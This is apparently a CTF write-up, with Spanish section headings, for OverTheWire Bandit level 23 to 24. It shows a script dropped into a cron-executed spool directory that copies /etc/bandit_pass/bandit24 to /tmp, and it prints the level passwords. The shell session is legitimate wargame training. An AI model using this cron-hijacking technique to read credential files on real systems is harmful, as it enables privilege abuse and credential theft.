## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.

**NOTE:** This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

**NOTE 2:** Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
## Datos de acceso al nivel
banidt23
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solución
```
bandit23@bandit:~$ ls -la /etc/cron.d
total 56
drwxr-xr-x   2 root root  4096 Oct  5 06:20 .
drwxr-xr-x 106 root root 12288 Oct  5 06:20 ..
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit15_root
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit17_root
-rw-r--r--   1 root root   120 Oct  5 06:19 cronjob_bandit22
-rw-r--r--   1 root root   122 Oct  5 06:19 cronjob_bandit23
-rw-r--r--   1 root root   120 Oct  5 06:19 cronjob_bandit24
-rw-r--r--   1 root root    62 Oct  5 06:19 cronjob_bandit25_root
-rw-r--r--   1 root root   201 Jan  8  2022 e2scrub_all
-rwx------   1 root root    52 Oct  5 06:20 otw-tmp-dir
-rw-r--r--   1 root root   102 Mar 23  2022 .placeholder
-rw-r--r--   1 root root   396 Feb  2  2021 sysstat
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/ja
bandit23@bandit:~$ cd /tmp/ja
bandit23@bandit:/tmp/ja$ nano con24.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory


Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/ja$ cat con24.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/ja/password
bandit23@bandit:/tmp/ja$ chmod +rx con24.sh
bandit23@bandit:/tmp/ja$ chmod 777 /tmp/ja
bandit23@bandit:/tmp/ja$ touch password
bandit23@bandit:/tmp/ja$ ls
con24.sh  password
bandit23@bandit:/tmp/ja$ chmod +rwx password
bandit23@bandit:/tmp/ja$ cp con24.sh /var/spool/bandit24/con24.sh
cp: cannot create regular file '/var/spool/bandit24/con24.sh': Operation not permitted
bandit23@bandit:/tmp/ja$ cp con24.sh /var/spool/bandit24/
cp: cannot create regular file '/var/spool/bandit24/con24.sh': Operation not permitted
bandit23@bandit:/tmp/ja$ nano con24.sh
Unable to create directory /home/bandit23/.local/share/nano/: No such file or directory
It is required for saving/loading search history or cursor positions.

bandit23@bandit:/tmp/ja$ cp con24.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/ja$ cat password
bandit23@bandit:/tmp/ja$ chmod 666 password
bandit23@bandit:/tmp/ja$ cp con24.sh /var/spool/bandit24/foo/
bandit23@bandit:/tmp/ja$ cat password
bandit23@bandit:/tmp/ja$ cp con24.sh /var/spool/bandit24/
cp: cannot create regular file '/var/spool/bandit24/con24.sh': Operation not permitted
bandit23@bandit:/tmp/ja$ cp con24.sh /var/spool/bandit24/foo/con24.sh
bandit23@bandit:/tmp/ja$ cat password
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/tmp/ja$
```
## Notas adicionales
## Referencias 
